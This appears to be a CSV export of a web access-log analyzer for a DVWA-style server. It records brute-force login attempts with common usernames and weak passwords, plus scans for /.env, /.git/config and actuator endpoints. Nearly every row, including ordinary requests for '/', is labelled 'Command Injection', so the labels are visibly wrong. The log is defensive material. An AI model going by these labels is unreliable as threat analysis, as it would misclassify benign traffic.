access.log,Command Injection,06/Apr/2024:00:13:58 +0000,/,198.74.56.46,-
access.log.1,Command Injection,05/Apr/2024:15:58:29 +0000,/vulnerabilities/brute/?username=test&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:30 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:30 +0000,/vulnerabilities/brute/?username=guest&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:30 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:31 +0000,/vulnerabilities/brute/?username=info&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:31 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:31 +0000,/vulnerabilities/brute/?username=adm&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:32 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:32 +0000,/vulnerabilities/brute/?username=mysql&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:32 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:33 +0000,/vulnerabilities/brute/?username=user&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:33 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:33 +0000,/vulnerabilities/brute/?username=administrator&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:34 +0000,/vulnerabilities/brute/?username=oracle&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:35 +0000,/vulnerabilities/brute/?username=ftp&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:35 +0000,/vulnerabilities/brute/?username=pi&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:36 +0000,/vulnerabilities/brute/?username=puppet&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:37 +0000,/vulnerabilities/brute/?username=ansible&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:37 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:38 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:39 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:39 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:39 +0000,/vulnerabilities/brute/?username=root&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:40 +0000,/vulnerabilities/brute/?username=admin&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:41 +0000,/vulnerabilities/brute/?username=test&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:41 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:41 +0000,/vulnerabilities/brute/?username=guest&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:42 +0000,/vulnerabilities/brute/?username=info&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:43 +0000,/vulnerabilities/brute/?username=adm&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:43 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:43 +0000,/vulnerabilities/brute/?username=mysql&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:44 +0000,/vulnerabilities/brute/?username=user&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:45 +0000,/vulnerabilities/brute/?username=administrator&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:45 +0000,/vulnerabilities/brute/?username=oracle&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:46 +0000,/vulnerabilities/brute/?username=ftp&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:47 +0000,/vulnerabilities/brute/?username=pi&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:47 +0000,/vulnerabilities/brute/?username=puppet&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:48 +0000,/vulnerabilities/brute/?username=ansible&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:49 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:49 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:50 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:51 +0000,/vulnerabilities/brute/?username=root&amp;password=12345678&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:51 +0000,/vulnerabilities/brute/?username=admin&amp;password=12345678&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:52 +0000,/vulnerabilities/brute/?username=test&amp;password=12345678&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:59:14 +0000,/.env,78.153.140.179,-
access.log.1,Command Injection,05/Apr/2024:15:59:14 +0000,/.env,78.153.140.179,-
access.log.1,Command Injection,05/Apr/2024:15:59:14 +0000,-,78.153.140.179,-
access.log.1,Command Injection,05/Apr/2024:16:00:38 +0000,/log_analysis_report.html,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:39 +0000,/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:39 +0000,/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:39 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:39 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:40 +0000,/log_analysis_report.html,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:40 +0000,/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:40 +0000,/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:40 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:40 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:03:41 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:16:03:41 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:16:03:42 +0000,/,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:16:09:40 +0000,/,172.104.11.51,-
access.log.1,Command Injection,05/Apr/2024:16:13:24 +0000,/,45.79.181.104,-
access.log.1,Command Injection,05/Apr/2024:16:26:34 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:16:38:05 +0000,/,45.79.181.251,-
access.log.1,Unusual Request Methods,05/Apr/2024:17:15:06 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:17:15:06 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:17:28:19 +0000,/,185.224.128.43,-
access.log.1,Unusual Request Methods,05/Apr/2024:17:56:36 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:17:56:36 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:18:11:25 +0000,/,192.155.88.231,-
access.log.1,Command Injection,05/Apr/2024:18:28:33 +0000,-,45.79.181.223,-
access.log.1,Command Injection,05/Apr/2024:18:34:43 +0000,/,45.79.128.205,-
access.log.1,Command Injection,05/Apr/2024:18:41:27 +0000,/,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:31 +0000,/,206.168.34.38,-
access.log.1,Error Codes,05/Apr/2024:18:41:31 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:31 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:35 +0000,/login.php,206.168.34.38,-
access.log.1,Error Codes,05/Apr/2024:18:41:35 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:35 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:35 +0000,/favicon.ico,206.168.34.38,-
access.log.1,Error Codes,05/Apr/2024:18:41:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:18:41:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:18:41:53 +0000,/,54.37.79.75,-
access.log.1,Error Codes,05/Apr/2024:18:42:26 +0000,/.git/config,91.92.255.41,-
access.log.1,Command Injection,05/Apr/2024:18:42:26 +0000,/.git/config,91.92.255.41,-
access.log.1,Error Codes,05/Apr/2024:18:53:52 +0000,/.env,188.93.233.146,-
access.log.1,Command Injection,05/Apr/2024:18:53:52 +0000,/.env,188.93.233.146,-
access.log.1,Command Injection,05/Apr/2024:18:53:53 +0000,/,188.93.233.146,-
access.log.1,Command Injection,05/Apr/2024:18:56:27 +0000,/,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:32 +0000,/,167.94.138.52,-
access.log.1,Error Codes,05/Apr/2024:18:56:32 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:32 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:35 +0000,/login.php,167.94.138.52,-
access.log.1,Error Codes,05/Apr/2024:18:56:35 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:35 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:35 +0000,/favicon.ico,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:19:03:46 +0000,/,45.79.181.251,-
access.log.1,Command Injection,05/Apr/2024:19:04:54 +0000,/,45.79.181.251,-
access.log.1,Command Injection,05/Apr/2024:19:19:16 +0000,/,69.164.217.245,-
access.log.1,Command Injection,05/Apr/2024:19:19:35 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:20:20 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:21:05 +0000,/,172.104.11.46,-
access.log.1,Command Injection,05/Apr/2024:19:21:29 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:22:14 +0000,/,45.79.181.179,-
access.log.1,Command Injection,05/Apr/2024:19:22:22 +0000,/,172.104.11.46,-
access.log.1,Command Injection,05/Apr/2024:19:24:53 +0000,/,192.155.90.118,-
access.log.1,Command Injection,05/Apr/2024:19:32:00 +0000,/,192.155.90.118,-
access.log.1,Command Injection,05/Apr/2024:19:33:23 +0000,/,45.79.163.53,-
access.log.1,Command Injection,05/Apr/2024:19:35:59 +0000,/,192.155.90.118,-
access.log.1,Command Injection,05/Apr/2024:19:37:55 +0000,/,172.104.210.105,-
access.log.1,Command Injection,05/Apr/2024:19:38:33 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:39:17 +0000,/,45.79.181.179,-
access.log.1,Command Injection,05/Apr/2024:19:39:22 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:19:40:20 +0000,/,192.155.90.220,-
access.log.1,Command Injection,05/Apr/2024:19:41:51 +0000,/,192.155.90.118,-
access.log.1,Error Codes,05/Apr/2024:19:51:44 +0000,/.git/config,52.143.131.119,-
access.log.1,Command Injection,05/Apr/2024:19:51:44 +0000,/.git/config,52.143.131.119,-
access.log.1,Command Injection,05/Apr/2024:19:55:46 +0000,/,45.79.172.21,-
access.log.1,Command Injection,05/Apr/2024:20:13:45 +0000,/,45.79.128.205,-
access.log.1,Command Injection,05/Apr/2024:20:18:00 +0000,/,45.79.181.223,-
access.log.1,Unusual Request Methods,05/Apr/2024:20:26:47 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:20:26:47 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:21:07:58 +0000,/,172.105.128.11,-
access.log.1,Command Injection,05/Apr/2024:21:15:10 +0000,-,193.109.85.36,-
access.log.1,Command Injection,05/Apr/2024:21:17:35 +0000,/,69.164.217.74,-
access.log.1,Command Injection,05/Apr/2024:21:17:57 +0000,/,45.33.80.243,-
access.log.1,Command Injection,05/Apr/2024:21:18:07 +0000,/,172.104.11.4,-
access.log.1,Command Injection,05/Apr/2024:21:29:03 +0000,/,45.79.128.205,-
access.log.1,Command Injection,05/Apr/2024:21:29:25 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:21:36:47 +0000,/?XDEBUG_SESSION_START=phpstorm,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:21:36:48 +0000,/login.php,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:21:54:46 +0000,/,185.224.128.43,-
access.log.1,Command Injection,05/Apr/2024:21:59:02 +0000,/,69.164.217.245,-
access.log.1,Command Injection,05/Apr/2024:21:59:37 +0000,/,172.104.11.4,-
access.log.1,Command Injection,05/Apr/2024:21:59:45 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:22:00:31 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:22:01:08 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:22:01:12 +0000,/,45.33.80.243,-
access.log.1,Command Injection,05/Apr/2024:22:01:59 +0000,/,172.105.128.12,-
access.log.1,Command Injection,05/Apr/2024:22:02:38 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:22:02:40 +0000,/,45.33.80.243,-
access.log.1,Command Injection,05/Apr/2024:22:08:39 +0000,/,45.79.128.205,-
access.log.1,Error Codes,05/Apr/2024:22:28:36 +0000,/api/v0/id,198.211.115.238,-
access.log.1,Command Injection,05/Apr/2024:22:28:36 +0000,/api/v0/id,198.211.115.238,-
access.log.1,Error Codes,05/Apr/2024:22:41:09 +0000,/.env,46.238.160.112,-
access.log.1,Command Injection,05/Apr/2024:22:41:09 +0000,/.env,46.238.160.112,-
access.log.1,Error Codes,05/Apr/2024:22:46:11 +0000,/actuator/gateway/routes,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:22:46:11 +0000,/actuator/gateway/routes,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:22:47:36 +0000,/,198.235.24.161,-
access.log.1,Command Injection,05/Apr/2024:22:47:37 +0000,/login.php,198.235.24.161,-
access.log.1,Unusual Request Methods,05/Apr/2024:22:49:37 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:22:49:37 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:23:01:06 +0000,/log_analysis_report.html,119.74.129.29,-
access.log.1,Error Codes,05/Apr/2024:23:01:07 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:01:07 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log.1,Error Codes,05/Apr/2024:23:01:07 +0000,/sd,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:01:07 +0000,/sd,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:01:58 +0000,-,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:02:13 +0000,-,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:14:40 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:23:16:09 +0000,/,172.105.128.13,-
access.log.1,Command Injection,05/Apr/2024:23:17:02 +0000,/,172.105.128.13,-
access.log.1,Error Codes,05/Apr/2024:23:22:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:23:22:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:23:22:54 +0000,/,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:23:24:47 +0000,/,185.224.128.43,-
access.log.1,Command Injection,05/Apr/2024:23:26:00 +0000,/,172.105.128.11,-
access.log.1,Command Injection,05/Apr/2024:23:26:54 +0000,/,172.105.128.11,-
access.log.1,Error Codes,05/Apr/2024:23:29:38 +0000,/.env,83.147.54.190,-
access.log.1,Command Injection,05/Apr/2024:23:29:38 +0000,/.env,83.147.54.190,-
access.log.1,Command Injection,05/Apr/2024:23:29:38 +0000,/,83.147.54.190,-
access.log.1,Command Injection,05/Apr/2024:23:33:50 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:23:45:35 +0000,/,185.224.128.43,-
access.log.1,Error Codes,05/Apr/2024:23:46:39 +0000,/.git/config,52.143.128.224,-
access.log.1,Command Injection,05/Apr/2024:23:46:39 +0000,/.git/config,52.143.128.224,-
access.log.1,Unusual Request Methods,05/Apr/2024:23:48:35 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:23:48:35 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:23:48:40 +0000,/,69.164.217.74,-
access.log.1,Command Injection,05/Apr/2024:23:48:51 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:23:59:49 +0000,/,185.224.128.43,-
